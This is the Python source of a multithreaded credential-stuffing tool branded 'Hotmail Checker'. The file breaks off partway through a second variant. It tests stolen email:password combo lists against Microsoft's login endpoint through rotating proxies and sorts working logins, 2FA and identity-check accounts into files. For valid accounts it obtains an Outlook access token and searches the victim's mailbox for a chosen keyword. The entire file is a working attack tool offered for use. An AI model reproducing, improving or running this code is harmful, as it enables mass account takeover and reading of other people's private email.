import os,sys,easygui,time,tkinter
import datetime,wget,base64
import plyer.platforms.win.notification
from plyer import notification
try:
  from requests import session
  import requests,random,time,threading,re
  import concurrent.futures
  import html
except:
  os.system("pip install requests")
  os.system("pip install colorama")
  os.system("pip install -U requests[socks]")
  from requests import session
  from random import randint
from requests import session
from time import sleep
from time import strftime 
from subprocess import check_output
import tkinter as tk 
from tkinter import filedialog
from sys import stdout
try:
    if '.exe' in sys.argv[0]:
        os.system(f'title Hotmail Checker v3.15.0 - t.me/userbtd')
    else:
        pass
except:
    quit()
root = tkinter.Tk()
root.withdraw()
lock = threading.Lock()
day = datetime.datetime.now()
def free_print(arg):
    lock.acquire()
    stdout.flush()
    print(arg)
    lock.release()  
def clear():
        if os.name=='nt':os.system('cls')
        else:os.system('clear')
clear()
logo = '''
\033[1;36;40m
   __ __     __             _ __  _______           __          
  / // /__  / /___ _  ___ _(_) / / ___/ /  ___ ____/ /_____ ____
 / _  / _ \/ __/  ' \/ _ `/ / / / /__/ _ \/ -_) __/  '_/ -_) __/
/_//_/\___/\__/_/_/_/\_,_/_/_/  \___/_//_/\__/\__/_/\_\\__/_/   
                                                                    Owner: @userbtd    
                                                                    Channel: t.me/btd_configs                                                                                                                         
\033[0m
'''
checkupdate = requests.get('https://raw.githubusercontent.com/btdtools04/hlo/main/.version').text
version = "3.15"
if float(checkupdate) == float(version):
    pass
else:
    print("PLEASE UPDATE!!!")
    notification.notify("PLEASE UPDATE", "CONTACT ADMIN FOR UPDATE!!!\nt.me/userbtd")
    get_link = requests.get("https://raw.githubusercontent.com/btdtools04/hlo/main/.link_update").text.strip()
    lua_chon = input(f"{get_link}\nUpdate now? (y,n) ")
    try:
        if ("y" in lua_chon) or ("Y" in lua_chon):
            update = wget.download(get_link, "update.zip")
            time.sleep(10)
            sys.exit()
        else:
            time.sleep(10)
            sys.exit()
    except:
        time.sleep(10)
        sys.exit()
dayss = int(datetime.datetime.now().strftime("%d"))
month = int(datetime.datetime.now().strftime("%m"))
year = int(datetime.datetime.now().strftime("%Y"))
key = 'HuyAnhDz'
days = 100000
clear()
def hotmail_search():
    clear()
    class Hotmail:
        def __init__(self):
            self.data = []
            self.prx1 = []
            self.hits, self.found, self.checkertotal, self.phantram, self.identify, self.mfa, self.bad, self.error, self.retries, self.cpm = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        def cpm_counter(self):
            while True:
                previous = self.checkertotal
                time.sleep(4)
                after = self.checkertotal
                self.cpm = (after-previous) * 15
        def phantramdachay(self):
            while True:
                checked = self.checkertotal
                total = len(self.data)
                phantram1 = round(checked / total * 100)
                self.phantram = (phantram1)
        def update_title(self):
            while True:
                elapsed = time.strftime('%H : %M : %S', time.gmtime(time.time() - self.start))
                os.system('title Hotmail - Checked: %s/%s (%s%s) ^| Hits: %s ^| Found: %s ^| Identify: %s ^| 2Fa: %s ^| Bad: %s ^| Retries: %s ^| Error: %s ^| CPM: %s ^| %s' % (self.checkertotal, len(self.data), self.phantram, "%", self.hits, self.found, self.identify, self.mfa, self.bad, self.retries, self.error, self.cpm, elapsed, ))
                time.sleep(0.4)
        def runcheck(self,email,pwd,prxx,proxytype,keyword):
            try:
                proxiesx = {
                    'http': proxytype+'://'+random.choice(prxx).strip(),
                    'https': proxytype+'://'+random.choice(prxx).strip(),
                }
                if ('@outlook' in email) or ('@hotmail' in email) or ('@live' in email) or ('@msn' in email):
                    #sesion
                    session = requests.session()
                    headers_0 = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; ASUS_Z01QD Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 PKeyAuth/1.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "X-Requested-With": "com.microsoft.todos",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=000000004C18365E&scope=profile+offline_access+openid+https%3a%2f%2fsubstrate.office.com%2ftodo-internal.readwrite&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code&state=ProjectCheshire&login_hint=dsds&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bf1bd7169&uaid=72793daae92b4f74b1a341abbcae22d6&msproxy=1&issuer=mso&tenant=consumers&ui_locales=vi-VN&client_info=1&epct=PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPnFfXp7CZ4zSA9Dq6Ljr6_lo-QyZxciq-HmjCoW6CC0q0KdaXxUV_IsnYEHcAj7G2AudG-84688Kbi4dnO2STFtbRpEFJuxoBBQwkA7ML9BAb3I6hv653yXUBsJVMQCXofAWleoLiCHwjUVrnmctbrq6bZ6pg8Q8OiDM6AjE3hZ1abIWrjX06XtOG3vy6FFmXQBbXhcd-N9n8bbXyxWpK4SAA&jshs=0&haschrome=1&noauthcancel=1",
                        "Accept-Encoding": "gzip, deflate",
                        "Cookie": "MSPRequ=id=N&lt=1696249094&co=1; uaid=72793daae92b4f74b1a341abbcae22d6; RefreshTokenSso=DUQPuLPWU6jqQqFWdj04413ZzRmmaU8wVHRqgSbGKkTjlhnTE!n*kseZXKpq!NM3K0dksrMQIhd6BgHqopKTZHFpOunpPYBfjK!JYdT7hKDJXJX24SpTqefLLjyc8AyGR1nq1Nb4OktNj1fzJX6wFyg$; OParams=11O.DbwoKczvJrFtKgQEoA47SYgVu0RSjOnCZ*ZPQpATRpuKRKYADI8GSNRuU2tLUDY8YcdYCtvSHkr8xkGaxIsBxcZkKKIt2JwekR8NNA7UneH8RQcy14xJiS2zF4L4HGghhO6l9Jk3FNISyLgXDGq2jrDwKGBpG7OYKbaMYFh36QpF91Tqv0g1oWR2!gccme3tXagYnZQ3oTWiam!476hQJUZrBn5ojaGPxVXbxbYwXFtAnRhZjXC6gH7l9TelFHTmjqXkpbnGN83bZXcdvmNYihv6kYDno302fAB5aG0pZdbaLsPnDpiUyjhIGzMAeMAyfnJtXn!*3zUkMyeSYFimWTfTyNVi6b0GY3fsPK59mAqJOtNd0s12jKAehTlRjG*v0VOkNiAGxMTUwxU78H4SFt79tArwY7W7!oc2NLjyIJHNkNAkiS*9xG94iLUynBecEx5ZK24t5M2dWjeK2aafZPxW6eeQyIFKrdD3RADPNtney4uUn7yiAw6Pcnv4J1j2J2IxPG*sQNsIY*ioAbjZC07ontikAeVhWs4SGIRFQFQKh9qaK0*cjWkUH*jX6GXg2cRv9uXuJ9Rcjh4oOUGvn4WqdIPGVeuunsL9B4k8nic6HstcEeesoV2I7HpDNNFpGJqNxFzjenKZe46tuucx6q4NQfO9RqPSUmKhgKWQy17GkWQAu15y*uMlXJpeov0FanO7Mph7gpEGQPXYd9QAq8V3RAbreftsV5RCeA6RcXwrCLbD80zjoalVZ63*gofUjuW0wppnS8dzT2Gp1TC*Uxw3ifqji9iOrKJckOSrw66jCsG57ckGu1Mz5CiQ1GdCfLwdEZHDCe8J8CWPDVGlLb4$; MicrosoftApplicationsTelemetryDeviceId=55da001a-79ec-4352-8a39-9626a082baef; MSPOK=$uuid-a404b084-54ed-4a77-a0e2-fc3528659b2b$uuid-39298aec-620e-46e7-a3c1-ad68a2f309ca$uuid-ec72f927-727f-4172-b4d4-4ff7b5b51f92; ai_session=TsKXDWsbJ/J0VEFqNde6Ce|1696249097557|1696249171163; MSFPC=GUID=73726fb1249a430496deca911fd34058&HASH=7372&LV=202310&V=4&LU=1696249184735; wlidperf=FR=L&ST=1696249211795",
                    }
                    u = f"https://login.live.com/ppsecure/post.srf?client_id=000000004C18365E&contextid=61E2B8D7200931EF&opid=D514FCD23287A73D&bk=1696249094&uaid=72793daae92b4f74b1a341abbcae22d6&pid=15216"
                    post_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DVvlPB7EWmxzlTVcW7vWcYEFXN0%218g4kVyMoQ3dZRZDd6kxf*M2rX5siBABm6uIj%21G10W8q8L3ZR*Osce8fvGYURbydDmpRgmZkAivFpTwrq9gSCcO1Qblar21MAYvLsPbu9K63KwCOCozAN1vGVpXPXrWUDknCSNyxOc60sBXsd6EjXCfuxo5w9K%21kEjYRiuA%24%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=116863"
                    requests_0 = requests.post(url=u,data=post_data,headers=headers_0,proxies=proxiesx,timeout=10)
                    if ("BF:true,BI:false,sErrTxt" in requests_0.text):
                        self.checkertotal += 1
                        self.bad += 1
                    elif ("account.live.com/identity/" in requests_0.text) or ("account.live.com/pipl/" in requests_0.text) or ("account.live.com/proofs" in requests_0.text):
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Identify.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                        self.checkertotal += 1
                        self.identify += 1
                        free_print(f'\033[38;2;255;165;0m[~]Identity: {email}:{pwd}\033[0m')
                    elif ("com/recover?" in requests_0.text) or ("',CW:true" in requests_0.text) or ("/Confirm?" in requests_0.text) or ("/cancel?" in requests_0.text) or ("/Abuse?" in requests_0.text):
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/2Fa.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                        self.checkertotal += 1
                        self.mfa += 1
                        free_print(f'\033[38;2;255;165;0m[~]2Fa: {email}:{pwd}\033[0m')
                    elif ("https://login.live.com/oauth20_desktop.srf" in requests_0.url) or ("client_info=" in requests_0.url):
                        self.checkertotal += 1
                        self.hits += 1
                        try:
                            #request 1
                            headers_1 = {
                                "Host": "login.live.com",
                                "Cookie": "MSCC=; MicrosoftApplicationsTelemetryDeviceId=bed4fd86-a5f5-4287-a45f-e975f06425e6; SDIDC=CY3les*tSzjBELX9g6cUSxyrkMstQ!y70yYTgSDBPxTPwNOBZpbfo*WC3cBkmJq64MUSLBDcE065URbI9kUgZcXwWfq6VUSqfdxLo18D5G1L0wulSOHrn2G9JgHkpvLx4c5!sucRA7B1o3vosOGWYeU$; IgnoreCAW=1; MSPRequ=<MSPRequ>; uaid=<uaid>; OParams=<OParams>; ai_session=o4H7svoD0v87wOcUPP2mnD|1690790816976|1690790816976; MSPOK=$uuid-27cb213b-fbb9-4ef2-b0cf-2d5c3ca01d8b$uuid-98efff88-a400-496b-a273-a055e1036e66; wlidperf=FR=L&ST=1690790830287",
                                "Content-Length": "580",
                                "Cache-Control": "max-age=0",
                                "Sec-Ch-Ua": "",
                                "Sec-Ch-Ua-Mobile": "?0",
                                "Sec-Ch-Ua-Platform": "\"\"",
                                "Upgrade-Insecure-Requests": "1",
                                "Origin": "https://login.live.com",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36",
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                "Sec-Fetch-Site": "same-origin",
                                "Sec-Fetch-Mode": "navigate",
                                "Sec-Fetch-User": "?1",
                                "Sec-Fetch-Dest": "document",
                                "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=1f907974-e22b-4810-a9de-d9647380c97e&scope=xboxlive.signin+openid+profile+offline_access&redirect_uri=https%3a%2f%2fwww.xbox.com%2fauth%2fmsa%3faction%3dloggedIn%26locale_hint%3den-US&response_type=code&state=eyJpZCI6Ijg3MjQxOTZhLTdiNTctNDU3Mi1hNjQ2LTA1ZDE3MGUxMGM0ZSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7chttps%253A%252F%252Fwww.xbox.com%252Fen-US%252Flive&response_mode=fragment&nonce=8c97db0f-1f5a-4bcc-8c19-138c75ed840f&prompt=login&code_challenge=PWXyiidpgwVgFbjr75_HnLUg1mldKHRpP6Mwq1XzO54&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=2.32.2&uaid=a2ec42a84eb04c6c8c5e89c8fe0215ae&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1&epct=PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPL51jVcPRq4bVzByEIOPt9DKXPM3hsApbStBFDQl3UFtXOpnz_1P3YTbIXZEHsJ-6F7WXSSF4AXwWwGxb0UrhDx9rB2CYjzopodDjsSJ3LCEywn4vJy8u5jIGOXg0IAcdfZ3JfQL615OPmyTJ0c0Dpxo1apEtCGo0Yif5UunWWMg3csjR0-AdwmQHhPYcaJfK05Sf0CY5zHxY0q4XmyDd6yAA&jshs=0",
                                "Accept-Encoding": "gzip, deflate",
                                "Accept-Language": "en-US,en;q=0.9",
                                "Connection": "close",
                            }
                            post_data = f"i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DajK7rTsebFI%21s6PgGZ0nmM3KzZDuor8E55mfTyrmIlWfCws5uv*MmacSxl5pbRxhSor6p8r5yoBC6m%21KgJ2pmHLoOjEABYl8kv7OWcqiNTLpX6Yj%21o6tmGxDn0T74H9cBZLuR98atjOg6o4BONnsGALsv2kCGDhZipJqGiylU1KuMAB3xaMtf8HosSfVDuRnw%24%24&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=15696"
                            u_1 = "https://login.live.com/ppsecure/post.srf?lw=1&fl=dob,easi2&xsup=1&code_challenge=MoAj0Kx4EIZFw5yKSv7dP5m7_flS2s6Kxjlj9Vvu59c&code_challenge_method=S256&state=rRBzWO6L2L-hsaUxdjqqHojOx59m-9HYji6fXevTseO5ii-paywhWsf9EQijQscxylZ0ebO4-SVG_GuLYcVwYQ&client_id=00000000402B5328&response_type=code&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&contextid=81BAFD6C7572DD00&bk=1615810842&uaid=571262d5d28f4dfbba3976fa6210d296&pid=15216"
                            requests_1 = session.post(url=u_1,data=post_data,headers=headers_1,proxies=proxiesx,timeout=5)
                            #requests 2
                            headers_2 = {
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Pragma": "no-cache",
                                "Accept": "*/*",
                            }
                            u_2 = "https://outlook.live.com/owa/"
                            requests_2 = session.get(url=u_2,headers=headers_2,proxies=proxiesx,timeout=5)
                            #PARSE
                            u_3 = requests_2.text.split('action="')[1].split('"')[0]
                            rpscsrfstate = requests_2.text.split('RpsCsrfState=')[1].split('&')[0]
                            t = requests_2.text.split('id="t" value="')[1].split('"')[0]
                            nap = requests_2.text.split('id="NAP" value="')[1].split('"')[0]
                            anon = requests_2.text.split('ANON" value="')[1].split('"')[0]
                            post_data_1 = f"wbids=0&pprid=&wbid=MSFT&NAP={nap}&ANON={anon}&t={t}"
                            requests_3 = session.post(url=u_3,data=post_data_1,headers=headers_2,proxies=proxiesx,timeout=5)
                            #requests 3
                            headers_3 = {
                                "Host": "outlook.live.com",
                                "Connection": "keep-alive",
                                "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
                                "prefer": "exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"",
                                "x-req-source": "Mail",
                                "x-owa-canary": "",
                                "sec-ch-ua-mobile": "?0",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                                "x-owa-urlpostdata": "%7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%7D",
                                "content-type": "application/json; charset=utf-8",
                                "action": "GetAccessTokenforResource",
                                "ms-cv": "wIwpMs3WfWldPtdV9HFJKn.23",
                                "sec-ch-ua-platform": "\"Windows\"",
                                "Accept": "*/*",
                                "Origin": "https://outlook.live.com",
                                "Sec-Fetch-Site": "same-origin",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Dest": "empty",
                                "Referer": "https://outlook.live.com/",
                                "Accept-Language": "vi-VN,vi;q=0.9",
                            }
                            u_4 = "https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource"
                            requests_4 = session.get(url=u_4,headers=headers_3,proxies=proxiesx,timeout=5).json()
                            #PARSE
                            accesstoken = requests_4["AccessToken"]
                            #requests 4
                            headers_4 = {
                                "Host": "outlook.live.com",
                                "Content-Length": "860",
                                "Sec-Ch-Ua": "",
                                "X-Search-Griffin-Version": "GWSv2",
                                "Scenariotag": "mg",
                                "X-Ms-Appname": "owa-reactmail",
                                "Accept-Language": "it-IT",
                                "Authorization": "Bearer  "+accesstoken,
                                "Sec-Ch-Ua-Platform": "\"\"",
                                "Prefer": "exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\", exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"",
                                "X-Client-Flights": "OWA_BestMatch_V15,CalendarInsightsFlight",
                                "X-Owa-Canary": "<x-owa-canary>",
                                "X-Req-Source": "Mail",
                                "Sec-Ch-Ua-Mobile": "?0",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36",
                                "Content-Type": "application/json",
                                "Accept": "*/*",
                                "Origin": "https://outlook.live.com",
                                "Sec-Fetch-Site": "same-origin",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Dest": "empty",
                                "Referer": "https://outlook.live.com/",
                                "Accept-Encoding": "gzip, deflate",
                            }
                            post_data_2 = '{"Cvid":"8646103b-a6d0-2519-db86-53ccd3c0e6a5","Scenario":{"Name":"owa.react"},"TimeZone":"Cape Verde Standard Time","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}},{"Term":{"DistinguishedFolderName":"DeletedItems"}}]},"From":0,"Provenances":["Exchange"],"Query":{"QueryString":"'+keyword+'"},"RefiningQueries":null,"Size":25,"Sort":[{"Field":"Score","SortDirection":"Desc","Count":3},{"Field":"Time","SortDirection":"Desc"}],"QueryAlterationOptions":{"EnableSuggestion":true,"EnableAlteration":true,"SupportedRecourseDisplayTypes":["Suggestion","NoResultModification","NoResultFolderRefinerModification","NoRequeryModification"]},"PropertySet":"ProvenanceOptimized"}],"LogicalId":"8646103b-a6d0-2519-db86-53ccd3c0e6a5"}'
                            u_5 = "https://outlook.live.com/search/api/v1/query"
                            requests_5 = session.post(url=u_5,data=post_data_2,headers=headers_4,proxies=proxiesx,timeout=5).text
                            total = requests_5.split('"ResultSets":[{"Total":')[1].split(',"')[0]
                            free_print(f'\033[1;32;40m[~]Hit: {email}:{pwd} -> Keyword Found: {total}\033[0m')
                            open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Hits Keyword Found.txt", "a", encoding="utf-8").write(f"{email}:{pwd} -> Keyword Found: {total}""\n")
                            self.found += int(total)
                        except:
                            free_print(f'\033[1;32;40m[~]Hit: {email}:{pwd} -> Search Error\033[0m')
                            open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Hits Search Error.txt", "a", encoding="utf-8").write(f"{email}:{pwd}""\n")
                    else:
                        self.checkertotal += 1
                        self.bad += 1
                else:
                    open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                    self.checkertotal += 1
                    self.error += 1
            except:
                self.retries += 1
                self.runcheck(email,pwd,prxx,proxytype,keyword)
        def load_combo(self):
            try:
                file_name = input("Enter file name (with extension, e.g., sample.txt): ")
                with open(file_name, 'r', encoding='utf-8') as readFile:
                    self.data = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Combos: \033[1;31;40m{len(self.data)}\033[0m")
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def load_proxy(self):
            try:
                pr1 = input("Enter Proxy List file name (with extension, e.g., proxies.txt): ") 
                with open(pr1, 'r', encoding='utf-8') as readFile:
                    self.prx1 = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Proxies: \033[1;31;40m{len(self.prx1)}\033[0m\n")
                print(f'''\033[1;32;40m1:HTTP/s
        2:SOCKS4
        3:SOCKS5\033[0m''')
                choice = input('==> ')
                if choice == '1':
                    self.proxytype = 'http'
                elif choice == '2':
                    self.proxytype = 'socks4'
                elif choice == '3':
                    self.proxytype = 'socks5'
                else:
                    print('Vui lòng chọn một số hợp lệ như 1, 2 hoặc 3!')
                    time.sleep(1)
                    self.load_proxy()
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def runTools(self,thread_step,thread_count,keyword):
            try:
                for i in range(thread_step,len(self.data),thread_count):
                    username = self.data[i].strip()
                    if not ":" in username:
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(username+"\n")
                        self.checkertotal += 1
                        self.error += 1
                    else:
                        acc = username.split(":")
                        mail = acc[0]
                        pwd = acc[1]
                        self.runcheck(mail,pwd,self.prx1,self.proxytype,keyword)
            except:
                self.runcheck(username,"",self.prx1,self.proxytype,keyword)
        def main(self):
            os.system(f'title Hotmail Checker v3.15.0 - t.me/userbtd - Key:[{key}] - Remain Time:[{days}]')
            print(logo)
            try:
                os.mkdir('Output')
            except:
                pass
            try:
                save = os.mkdir(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}")
            except Exception as errors:
                pass
            time.sleep(0.8)
            
            self.load_combo() 
            self.load_proxy() 
            self.keyword = open("keyword.txt", 'r').read()
            self.thread_count = int(input('Thread: '))
            self.start = time.time()
            threading.Thread(target = self.cpm_counter, daemon=True).start()
            threading.Thread(target = self.update_title, daemon=True).start()
            threading.Thread(target = self.phantramdachay, daemon=True).start()
            time.sleep(0.1)
            clear()  
            print(logo)
            threads = []
            check = [0 for i in range(self.thread_count)]
            for x in range(self.thread_count):
                newThread = threading.Thread(target=self.runTools,args=(x,self.thread_count,self.keyword,))
                newThread.start()
            for t in threads:
                t.join()
            input('')
            os.system('pause>Log.txt')
    if __name__ == '__main__':
            x = Hotmail()
            x.main()
def only_show_hit_custom():
    clear()
    class Hotmail:
        def __init__(self):
            self.data = []
            self.prx1 = []
            self.hits, self.checkertotal, self.phantram, self.identify, self.mfa, self.bad, self.error, self.retries, self.cpm, self.ip = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        def cpm_counter(self):
            while True:
                previous = self.checkertotal
                time.sleep(4)
                after = self.checkertotal
                self.cpm = (after-previous) * 15
        def phantramdachay(self):
            while True:
                checked = self.checkertotal
                total = len(self.data)
                phantram1 = round(checked / total * 100)
                self.phantram = (phantram1)
        def update_title(self):
            while True:
                elapsed = time.strftime('%H : %M : %S', time.gmtime(time.time() - self.start))
                os.system('title Hotmail - Checked: %s/%s (%s%s) ^| Hits: %s ^| Identify: %s ^| 2Fa: %s ^| Bad: %s ^| Retries: %s ^| Error: %s ^| CPM: %s ^| %s' % (self.checkertotal, len(self.data), self.phantram, "%", self.hits, self.identify, self.mfa, self.bad, self.retries, self.error, self.cpm, elapsed, ))
                time.sleep(0.4)
        def runcheck(self,email,pwd,prxx,proxytype):
                proxiesx = {
                    'http': proxytype+'://'+str(random.choice(prxx).strip()),
                    'https': proxytype+'://'+str(random.choice(prxx).strip()),
                }
                try:
                    if ('@outlook' in email) or ('@hotmail' in email) or ('@live' in email) or ('@msn' in email):
                        #headers
                        headers_0 = {
                            "Content-Type": "application/x-www-form-urlencoded",
                            "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; ASUS_Z01QD Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 PKeyAuth/1.0",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "X-Requested-With": "com.microsoft.todos",
                            "Sec-Fetch-Site": "same-origin",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-User": "?1",
                            "Sec-Fetch-Dest": "document",
                            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=000000004C18365E&scope=profile+offline_access+openid+https%3a%2f%2fsubstrate.office.com%2ftodo-internal.readwrite&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code&state=ProjectCheshire&login_hint=dsds&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bf1bd7169&uaid=72793daae92b4f74b1a341abbcae22d6&msproxy=1&issuer=mso&tenant=consumers&ui_locales=vi-VN&client_info=1&epct=PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPnFfXp7CZ4zSA9Dq6Ljr6_lo-QyZxciq-HmjCoW6CC0q0KdaXxUV_IsnYEHcAj7G2AudG-84688Kbi4dnO2STFtbRpEFJuxoBBQwkA7ML9BAb3I6hv653yXUBsJVMQCXofAWleoLiCHwjUVrnmctbrq6bZ6pg8Q8OiDM6AjE3hZ1abIWrjX06XtOG3vy6FFmXQBbXhcd-N9n8bbXyxWpK4SAA&jshs=0&haschrome=1&noauthcancel=1",
                            "Accept-Encoding": "gzip, deflate",
                            "Cookie": "MSPRequ=id=N&lt=1696249094&co=1; uaid=72793daae92b4f74b1a341abbcae22d6; RefreshTokenSso=DUQPuLPWU6jqQqFWdj04413ZzRmmaU8wVHRqgSbGKkTjlhnTE!n*kseZXKpq!NM3K0dksrMQIhd6BgHqopKTZHFpOunpPYBfjK!JYdT7hKDJXJX24SpTqefLLjyc8AyGR1nq1Nb4OktNj1fzJX6wFyg$; OParams=11O.DbwoKczvJrFtKgQEoA47SYgVu0RSjOnCZ*ZPQpATRpuKRKYADI8GSNRuU2tLUDY8YcdYCtvSHkr8xkGaxIsBxcZkKKIt2JwekR8NNA7UneH8RQcy14xJiS2zF4L4HGghhO6l9Jk3FNISyLgXDGq2jrDwKGBpG7OYKbaMYFh36QpF91Tqv0g1oWR2!gccme3tXagYnZQ3oTWiam!476hQJUZrBn5ojaGPxVXbxbYwXFtAnRhZjXC6gH7l9TelFHTmjqXkpbnGN83bZXcdvmNYihv6kYDno302fAB5aG0pZdbaLsPnDpiUyjhIGzMAeMAyfnJtXn!*3zUkMyeSYFimWTfTyNVi6b0GY3fsPK59mAqJOtNd0s12jKAehTlRjG*v0VOkNiAGxMTUwxU78H4SFt79tArwY7W7!oc2NLjyIJHNkNAkiS*9xG94iLUynBecEx5ZK24t5M2dWjeK2aafZPxW6eeQyIFKrdD3RADPNtney4uUn7yiAw6Pcnv4J1j2J2IxPG*sQNsIY*ioAbjZC07ontikAeVhWs4SGIRFQFQKh9qaK0*cjWkUH*jX6GXg2cRv9uXuJ9Rcjh4oOUGvn4WqdIPGVeuunsL9B4k8nic6HstcEeesoV2I7HpDNNFpGJqNxFzjenKZe46tuucx6q4NQfO9RqPSUmKhgKWQy17GkWQAu15y*uMlXJpeov0FanO7Mph7gpEGQPXYd9QAq8V3RAbreftsV5RCeA6RcXwrCLbD80zjoalVZ63*gofUjuW0wppnS8dzT2Gp1TC*Uxw3ifqji9iOrKJckOSrw66jCsG57ckGu1Mz5CiQ1GdCfLwdEZHDCe8J8CWPDVGlLb4$; MicrosoftApplicationsTelemetryDeviceId=55da001a-79ec-4352-8a39-9626a082baef; MSPOK=$uuid-a404b084-54ed-4a77-a0e2-fc3528659b2b$uuid-39298aec-620e-46e7-a3c1-ad68a2f309ca$uuid-ec72f927-727f-4172-b4d4-4ff7b5b51f92; ai_session=TsKXDWsbJ/J0VEFqNde6Ce|1696249097557|1696249171163; MSFPC=GUID=73726fb1249a430496deca911fd34058&HASH=7372&LV=202310&V=4&LU=1696249184735; wlidperf=FR=L&ST=1696249211795",
                        }
                        u = f"https://login.live.com/ppsecure/post.srf?client_id=000000004C18365E&contextid=61E2B8D7200931EF&opid=D514FCD23287A73D&bk=1696249094&uaid=72793daae92b4f74b1a341abbcae22d6&pid=15216"
